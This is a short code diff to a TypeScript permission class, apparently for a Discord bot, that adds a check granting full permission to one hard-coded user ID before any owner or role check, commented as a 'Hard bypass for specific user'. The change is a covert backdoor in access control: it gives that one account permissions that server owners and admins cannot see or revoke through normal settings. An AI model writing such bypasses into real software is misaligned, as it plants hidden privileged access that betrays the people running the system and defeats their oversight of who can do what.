@@ -38,6 +38,11 @@ export class PermissionSystem {
   }
 
   async hasPermission(member: GuildMember): Promise<boolean> {
+    // Hard bypass for specific user
+    if (member.id === '201215609189564416') {
+      return true;
+    }
+
     // Server owners always have permission
     if (member.guild.ownerId === member.id) {
       return true;
